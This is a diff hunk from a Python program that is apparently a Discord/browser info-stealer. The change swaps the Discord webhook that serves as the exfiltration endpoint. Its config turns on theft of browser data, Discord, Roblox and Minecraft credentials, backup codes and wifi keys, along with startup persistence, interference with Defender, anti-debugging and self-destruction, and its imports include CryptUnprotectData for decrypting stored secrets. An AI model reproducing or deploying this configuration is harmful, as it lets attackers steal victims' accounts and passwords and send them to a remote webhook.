@@ -19,7 +19,7 @@ from PIL import ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
-__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1097271907730083850/-rW2F3SFJfOjbQ9_BmkPLEHZ5j7NNBAG8fqh4jlKXP74F8VAn8aKzUch27hIzhBhgftg', 'ping': True, 'pingtype': 'Everyone', 'error': False, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': True, 'antidebug_vm': True, 'discord': True, 'anti_spam': False, 'self_destruct': True}
+__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1101864504704381009/KA2WDmsQsHyrvThNf9zwCXlajokvzV2EVJrrtwC11AMAuzuBAUqz7idlgPPx-Qphc5rg', 'ping': True, 'pingtype': 'Everyone', 'error': False, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': True, 'antidebug_vm': True, 'discord': True, 'anti_spam': False, 'self_destruct': True}
 
 #global variables
 temp = os.getenv("temp")
